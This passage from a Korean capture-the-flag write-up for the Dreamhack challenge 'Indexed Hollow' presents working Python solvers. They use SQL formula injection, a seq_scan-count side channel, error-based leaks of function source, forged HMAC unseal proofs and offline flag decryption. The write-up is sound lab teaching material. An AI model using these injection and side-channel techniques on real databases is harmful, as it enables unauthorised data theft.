**`stat_exfil.py` 해설** `post()`는 공통 JSON 요청을 만든다. 감사 API만 `query='harvest'`를 추가하고 JSON 응답을 파싱한다. 내보내기 API는 CSV 본문을 받지만, 여기서는 그 본문의 값이 아니라 **수식을 실행했다는 효과**가 중요하다. `stat(table)`은 감사 API의 수식에 `pg_stat_all_tables.seq_scan`을 넣고 일부러 `::integer` 오류를 발생시킨다. 오류에서 정규식 `S=(\d+)`로 숫자를 뽑는다.

핵심 함수 `leak_number(value_sql,marker)`는 표식 테이블의 스캔 횟수를 먼저 읽고, `generate_series(1,value_sql)`을 사용한 내보내기 수식을 한 번 실행한 뒤 다시 스캔 횟수를 읽는다. 반환값 `after-before`가 `value_sql`의 값이다. `marker='worker_manifest'`라면 그 테이블의 `manifest_key`, `marker='export_capsule'`이라면 그 테이블의 `payload::text`를 `g::text`와 비교해 각 반복이 외부 변수에 의존하도록 만든다. 파일을 직접 실행하는 마지막 루프는 `get_byte(export_capsule.payload,i)`를 `i=0..7`까지 읽어, 결과가 실제 바이트 범위 0~255인지 확인하고 E의 16진수를 출력한다.

```python
import sys

from stat_exfil import leak_number


def field_text(field):
    return f"(SELECT string_agg({field},',' ORDER BY manifest_key) FROM archive_stage.worker_manifest)"


def extract(field, limit=None):
    source = field_text(field)
    length = leak_number(f'length({source})', 'export_capsule')
    if limit is not None:
        length = min(length, limit)
    print(field, 'length', length, flush=True)
    result = []
    for position in range(1, length + 1, 3):
        # Three printable ASCII characters fit in fewer than 95^3 table scans.
        # The export worker has a one-second statement timeout.
        chars = [f"(coalesce(ascii(nullif(substr(s,{position+i},1),'')),32)-32)" for i in range(3)]
        number = f"(SELECT {chars[0]}*9025+{chars[1]}*95+{chars[2]} FROM (SELECT {source} s) t)"
        value = leak_number(number, 'export_capsule')
        if not 0 <= value < 857375:
            raise RuntimeError(f'bad packet at {position}: {value}')
        packet = chr(value // 9025 + 32) + chr((value // 95) % 95 + 32) + chr(value % 95 + 32)
        result.append(packet)
        print(position, repr(packet), ''.join(result)[-60:], flush=True)
    answer = ''.join(result)[:length]
    print('RESULT', field, answer, flush=True)
    return answer


if __name__ == '__main__':
    extract(sys.argv[1] if len(sys.argv) > 1 else 'manifest_key')
```

**`read_manifest.py` 해설** 이 파일은 위 `stat_exfil.py`의 `leak_number()`를 가져온다. `field_text(field)`는 매니페스트의 지정 열을 `manifest_key` 순서로 정렬해 쉼표로 합친 SQL 서브쿼리를 만든다. 순서를 고정하지 않으면 여러 번 요청하는 사이 글자 위치가 달라질 수 있다. `extract()`는 먼저 전체 문자열 길이를 스캔 횟수로 읽는다.

이후 `position=1,4,7,...`에서 세 글자씩 읽는다. `substr(s,위치,1)`로 한 글자를 얻고 `ascii(...)-32`로 인쇄 가능한 문자를 0~94로 옮긴다. 끝부분의 빈 문자열은 `nullif`와 `coalesce`로 공백에 해당하는 0으로 바꾼다. 세 값을 `첫째×9025 + 둘째×95 + 셋째`로 합쳐 `leak_number(...,'export_capsule')`에 전달한다. 이번에는 `export_capsule`의 스캔 차이가 인코딩된 정수다. 코드의 `//`, `%`로 95진수 세 자리를 다시 꺼내고 32를 더해 문자로 복원한다. 마지막 `[:length]`는 채워 넣은 공백을 제거한다. 인자를 지정하지 않으면 `manifest_key`를 읽으며, `python read_manifest.py manifest_value`처럼 실행하면 값 열을 읽는다.

### 7.4. 오프라인 복호화 (`Indexed_Hollow_solve.py`)

```python
"""Reconstruct the Indexed Hollow flag from the recovered database values."""

from hashlib import sha256
from hmac import new as hmac_new

shares = [
    "50deff7918bca4b0",  # R: search order
    "66d4c1a740467822",  # T: formula timing
    "3ff36382c845952e",  # C: chart aggregate
    "d7b8686a714cd93a",  # A: audit error
    "0f66ebdf74e2fc0d",  # E: export scan statistics
]
chunks = [
    "6a5c2d7c1cbc06c0",
    "d53202a6ac059b71",
    "d5c070c6c060ba65",
    "948764eedefc8d02",
    "56aa1f21f9d833b7",
    "ea66",
]
unlock_domain = bytes.fromhex("496e646578656420486f6c6c6f77207365616c20763300")
stream_domain = bytes.fromhex("666c61672d73747265616d00")
unlock_key = sha256(unlock_domain + b"".join(bytes.fromhex(s) for s in shares)).digest()

plaintext = bytearray()
for index, chunk_hex in enumerate(chunks):
    ciphertext = bytes.fromhex(chunk_hex)
    stream = hmac_new(
        unlock_key, stream_domain + index.to_bytes(4, "big"), "sha256"
    ).digest()
    plaintext.extend(a ^ b for a, b in zip(ciphertext, stream))

flag = plaintext.decode("ascii")
assert flag.startswith("PD{") and flag.endswith("}")
print(flag)
```

**코드 해설** `shares`는 앞에서 각 채널로 찾은 R·T·C·A·E를 매니페스트의 순서 그대로 넣은 것이다. `bytes.fromhex(s)`는 16글자 텍스트를 실제 8바이트로 바꾼다. `unlock_domain`도 16진수를 바이트로 디코딩하고, `sha256(unlock_domain + ...).digest()`가 32바이트 키 K를 만든다. `.hexdigest()`를 쓰지 않은 이유는 이어지는 HMAC이 텍스트가 아니라 원시 키 바이트를 받아야 하기 때문이다.

루프의 `index.to_bytes(4,'big')`는 SQL의 `int4send(i)`에 대응한다. `hmac_new(...,'sha256').digest()`가 해당 인덱스의 32바이트 스트림을 만들고, `zip(ciphertext,stream)`은 암호문 길이만큼 앞부분을 짝지어 XOR한다. `plaintext.extend(...)`가 여섯 조각을 순서대로 연결한다. 마지막 `decode('ascii')`와 `PD{...}` 형식 검사는 결과가 사람이 읽는 플래그인지 확인한다. 로컬에서 이 파일을 실행했을 때 아래 문자열이 출력됐다.

실행 결과:

```text
PD{...}
```

### 7.5. 오류 채널로 함수 본문 읽기 (`read_proc.py`)

아래 코드는 3.4절의 `pg_proc.prosrc` 조회를 자동화한다.

```python
import http.cookiejar
import json
import os
import re
import urllib.request

base = os.environ.get('IH_BASE_URL','http://host3.dreamhack.games:18061').rstrip('/')
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
opener.open(base + '/', timeout=10).read()
chunks = []
for start in range(1, 1751, 110):
    expr = f"(SELECT substr(prosrc,{start},110) FROM pg_proc WHERE proname='unseal_index' AND pronamespace=(SELECT oid FROM pg_namespace WHERE nspname='worker_shadow'))::integer"
    req = urllib.request.Request(base + '/api/audit', data=json.dumps({'query':'harvest','index':{'kind':'formula','expr':expr}}).encode(), headers={'Content-Type':'application/json'}, method='POST')
    result = json.load(opener.open(req, timeout=20))
    error = result.get('engine_error','')
    match = re.search(r'invalid input syntax for type integer: "(.*)"', error, re.S)
    if not match:
        raise RuntimeError(f'{start}: {error}')
    chunks.append(match.group(1))
source = ''.join(chunks)
print(source)
```

**코드 해설** 시작 위치를 1부터 110글자 간격으로 바꾸며 동일한 감사 API 요청을 반복한다. `substr(prosrc,start,110)`은 한 번에 노출할 함수 본문 범위를 제한한다. `::integer` 오류의 `engine_error`에서 정규식으로 따옴표 안 텍스트를 추출하고, `chunks`에 저장한 뒤 이어 붙인다. 감사 API가 함수 소스를 직접 반환한 것이 아니라 **변환 오류가 소스 조각을 포함한 것**이다. 이 코드로 확인한 작업자·문맥 검사와 `proof` 검증 구간이 4절 취약점 분석의 근거다.

### 7.6. 저장 보고서 실행 (`report_probe.py`)

```python
import http.cookiejar
import json
import os
import sys
import time
import urllib.request

BASE = os.environ.get("IH_BASE_URL", "http://host3.dreamhack.games:18061").rstrip("/")


def main():
    expression = sys.argv[1]
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    with opener.open(BASE + "/", timeout=10):
        pass

    def post(path, body):
        request = urllib.request.Request(
            BASE + path,
            data=json.dumps(body).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with opener.open(request, timeout=20) as response:
            return json.load(response)

    saved = post(
        "/api/reports/save",
        {"name": "Indexed Hollow probe", "definition": {"version": 1, "index": {"kind": "formula", "expr": expression}}},
    )
    report_id = saved["report_id"]
    started = post("/api/reports/run", {"report_id": report_id})
    run_id = started["run_id"]
    for _ in range(100):
        with opener.open(BASE + f"/api/reports/{report_id}/runs/{run_id}", timeout=10) as response:
            result = json.load(response)
        if result.get("state") != "pending":
            break
        time.sleep(0.1)
    print(json.dumps(result))


if __name__ == "__main__":
    main()
```

**코드 해설** 실행할 SQL 표현식을 명령행 인자로 받는다. `/api/reports/save`가 보고서 정의를 저장하고 `report_id`를 반환한다. `/api/reports/run`은 그 보고서의 실행을 시작하고 `run_id`를 반환한다. 마지막 반복은 두 ID로 실행 상태를 조회해 `pending`이 끝날 때까지 0.1초 간격으로 기다린다. 따라서 보고서 결과에 `sealed_index`가 나오는지는 이 스크립트의 마지막 JSON 출력에서 확인한다. 첫 접속과 쿠키 처리 코드는 같은 세션으로 저장·실행·조회하기 위한 것이다.

### 7.7. 정상 HMAC 증명으로 K 검산 (`verify_unlock.py`)

```python
import hashlib
import sys

import report_probe

shares = bytes.fromhex(
    '50deff7918bca4b0'
    '66d4c1a740467822'
    '3ff36382c845952e'
    'd7b8686a714cd93a'
    '0f66ebdf74e2fc0d'
)
domain = bytes.fromhex('496e646578656420486f6c6c6f77207365616c20763300')
key = hashlib.sha256(domain + shares).digest()
worker = 'report_worker_f362e6cfdad09ff0'
owner = 'app_owner_3633d8e34e667402'
prefix = b'report-proof\0'
for role in (worker, owner):
    raw = role.encode()
    prefix += len(raw).to_bytes(2, 'big') + raw
message = (
    f"decode('{prefix.hex()}','hex')"
    "||uuid_send(current_setting('app.report_id')::uuid)"
    "||uuid_send(current_setting('app.run_id')::uuid)"
    "||int4send(0)"
)
formula = (
    'worker_shadow.unseal_index(0,'
    f"encode(crypto.hmac({message},decode('{key.hex()}','hex'),'sha256'),'hex'))"
)
print('unlock_key_sha256', key.hex(), flush=True)
print('formula_bytes', len(formula.encode()), flush=True)
sys.argv = ['report_probe.py', formula]
report_probe.main()
```

**코드 해설** 이 코드는 다섯 조각과 unlock 도메인으로 K를 다시 만들고, 4절에서 읽은 함수 소스의 증명 메시지 형식을 따른다. `worker`와 `owner`는 인스턴스마다 바뀌므로 새 환경에서 카탈로그와 보고서 응답으로 확인한 역할명을 넣어야 한다. 역할명 앞의 `len(raw).to_bytes(2,'big')`는 서버의 `int2send`와 맞추기 위한 길이 접두사다. 이어지는 `uuid_send(current_setting(...))`와 `int4send(0)`은 실행 중인 보고서의 ID 및 조각 인덱스를 서버 내부와 같은 바이트 형식으로 만든다.

`crypto.hmac(message,K,'sha256')`로 계산한 정상 증명을 16진수 텍스트로 바꾸어 `unseal_index`의 두 번째 인자로 넣는다. `report_probe.main()`이 해당 수식을 보고서 작업자로 실행한다. `NULL` 우회를 쓰지 않고도 인덱스 0의 암호문이 반환되므로, K를 구성하는 도메인·조각 순서·바이트 표현이 맞았음을 별도로 확인할 수 있다. 이 코드의 역할명은 확인 당시의 `:18061` 인스턴스 값이다.

## 8. 검증 관점과 참고 문서

고정 CSV를 보고 수식이 무시된다고 결론 냈다면 마지막 조각을 놓쳤을 것이다. 실제 수식 실행 여부는 요청 전후 `seq_scan` 차이로 확인했다. 또한 `NULL` 증명 우회로 얻은 값은 암호문이므로 그 시점에 플래그를 단정하지 않았다. 최종 키는 서버가 정상 HMAC 증명으로 받아들였고, 오프라인 복호화는 여섯 조각 모두에서 플래그 형식의 문자열을 냈다.

[1] PostgreSQL, Row Security Policies: https://www.postgresql.org/docs/current/ddl-rowsecurity.html  
[2] PostgreSQL, PL/pgSQL Control Structures (`IF`): https://www.postgresql.org/docs/current/plpgsql-control-structures.html  
[3] PostgreSQL, Monitoring Statistics (`pg_stat_all_tables`): https://www.postgresql.org/docs/current/monitoring-stats.html  
[4] PostgreSQL, pgcrypto (`hmac`): https://www.postgresql.org/docs/current/pgcrypto.html  
[5] PostgreSQL, Binary String Functions (`get_byte`): https://www.postgresql.org/docs/current/functions-binarystring.html  
[6] PostgreSQL, `pg_proc` system catalog (`prosrc`): https://www.postgresql.org/docs/current/catalog-pg-proc.html


